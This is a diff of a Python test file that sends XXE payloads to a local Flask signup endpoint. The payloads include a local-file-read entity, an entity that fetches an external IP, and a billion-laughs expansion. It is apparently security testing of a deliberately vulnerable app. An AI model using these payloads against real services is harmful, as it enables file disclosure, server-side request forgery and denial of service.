@@ -1,5 +1,6 @@
 import unittest
 from app import db
+import random
 #from app import app,add_user,User
 import requests as re
 
@@ -21,7 +22,7 @@ class TestAddUser(unittest.TestCase):
         # expected_xml = """
         # '<?xml version="1.0" encoding="UTF-8" ?><root><message type="str">John created</message></root>'
         # """
-        expected_json={"status": "fail", "message": "Email already exists", "user": "xxe;", "email": "assbhjbvjhbjhhgss"}
+        expected_json={"status": "fail", "message": "Email already exists", "user": "xxe;", "email": "john@xxe.com"}
         # print("this is responsedata",response.data)
         # print("expected xml is ",expected_xml)
         response_data_str = response.json()
@@ -30,7 +31,7 @@ class TestAddUser(unittest.TestCase):
 
     def test_add_user_missing_name(self):
         # Send a POST request to the /user endpoint with XML data that is missing the name element
-        xml_data = """<user><password>password123</password><email>john@example.com</email></user>"""
+        xml_data = """<user><password>password123</password><email>john@xxe.com</email></user>"""
         response = re.post('http://127.0.0.1:5000/signup', data=xml_data, headers=headers)
 
         # Assert that the response has a 400 status code
@@ -44,8 +45,10 @@ class TestAddUser(unittest.TestCase):
         self.assertEqual(response_data_str, expected_json)
 
     def test_add_user_read_file(self):
+        randEmail = str(random.randint(1, 1000)) + "@" + str(random.randint(1, 1000)) + ".com"
         # Send a POST request to the /user endpoint with valid XML data
-        xml_data = """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///D:/a.txt"> ]><root><password>emsassacszdil5</password><name>&xxe;</name><email>assxkzkm sdmv dmdmkj</email></root>"""
+        xml_data = """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///C:/Users/USER/Desktop/a.txt"> ]><root><password>emsassacszdil5</password><name>&xxe;</name><email>""" + randEmail + """</email></root>"""
+        #"""<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///C:/Users/USER/Desktop/a.txt"> ]><root><password>emsassacszdil5</password><name>&xxe;</name><email>assxkzkm sömkdmvdmdmkj</email></root>"""
         response = re.post('http://127.0.0.1:5000/signup', data=xml_data, headers=headers)
 
         # Assert that the response has a 200 status code
@@ -63,8 +66,9 @@ class TestAddUser(unittest.TestCase):
         self.assertEqual("success", response_data_str["status"])
     
     def test_add_user_read_link(self):
+        randEmail = str(random.randint(1, 1000)) + "@" + str(random.randint(1, 1000)) + ".com"
         # Send a POST request to the /user endpoint with valid XML data
-        xml_data = """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://174.129.167.65/"> ]><signup><name>&xxe;</name><email>alsvmzcmdz kfdmvmgfkaa</email><password>456654123</password></signup>"""
+        xml_data = """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://174.129.167.65/"> ]><signup><name>&xxe;</name><email>""" + randEmail + """"</email><password>456654123</password></signup>"""
         response = re.post('http://127.0.0.1:5000/signup', data=xml_data, headers=headers)
 
         # Assert that the response has a 200 status code
@@ -82,8 +86,19 @@ class TestAddUser(unittest.TestCase):
         self.assertEqual("success", response_data_str["status"])
     
     def test_add_user_billioan_laughs_attack(self):
+        randEmail = str(random.randint(1, 1000)) + "@" + str(random.randint(1, 1000)) + ".com"
         # Send a POST request to the /user endpoint with valid XML data
-        xml_data = """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><signup><name>&lol9;</name><email>aaaaaaaaaaacdcsdaa</email><password>456654123</password></signup>"""
+        xml_data = """<?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+        <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+        <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+        <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+        <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+        <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+        <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+        <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]>
+        <signup><name>&lol9;</name><email>""" + randEmail + """</email><password>456654123</password></signup>"""
         response = re.post('http://127.0.0.1:5000/signup', data=xml_data, headers=headers)
 
         # Assert that the response has a 200 status code
